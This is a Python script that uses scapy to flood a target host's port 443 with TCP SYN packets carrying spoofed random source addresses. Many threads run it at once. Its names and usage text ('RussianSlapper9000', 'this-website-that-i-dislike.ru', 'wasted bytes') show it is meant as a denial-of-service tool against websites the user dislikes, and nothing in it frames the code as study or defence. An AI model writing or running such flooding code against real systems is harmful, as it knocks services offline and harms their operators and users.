import random

from scapy.all import *

connections: int = 0


def random_ip() -> str:
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip


def random_int() -> int:
    x = random.randint(1000, 9000)
    return x


def flood_tcp(host: str):
    global connections
    try:
        s_port: int = random_int()
        s_eq: int = random_int()
        w_indow: int = random_int()

        IP_Packet = IP()
        IP_Packet.src = random_ip()
        IP_Packet.dst = host

        TCP_Packet = TCP()
        TCP_Packet.sport = s_port
        TCP_Packet.dport = 443
        TCP_Packet.flags = "S"
        TCP_Packet.seq = s_eq
        TCP_Packet.window = w_indow

        RAW = Raw(b"X" * 1024)

        send(IP_Packet / TCP_Packet / RAW, verbose=0)

        time.sleep(3)
        connections += 1
    except (socket.error, socket.timeout):
        pass


class RussianSlapper9000(threading.Thread):
    def __init__(self, hostname: str):
        self.hostname = hostname
        super().__init__()

    def run(self):
        while True:
            flood_tcp(self.hostname)


def run():
    global connections
    if len(sys.argv) < 3:
        print(
            "Correct usage is python -m siege_engine number-of-threads-you-want-to-ping this-website-that-i-dislike.ru"
        )
        sys.exit(1)
    amount, hostname = sys.argv[1:]
    print(f"Pinging {hostname} on {amount} threads")
    amount = int(amount)
    now = (time.time())
    for _ in range(amount):
        RussianSlapper9000(hostname).start()
    while True:
        if int(time.time()) != now:
            now = int(time.time())
            print(
                f"Last seconds made {connections} calls "
                f"which involved {connections * 24} wasted bytes on behalf of the {hostname}"
            )
            connections = 0
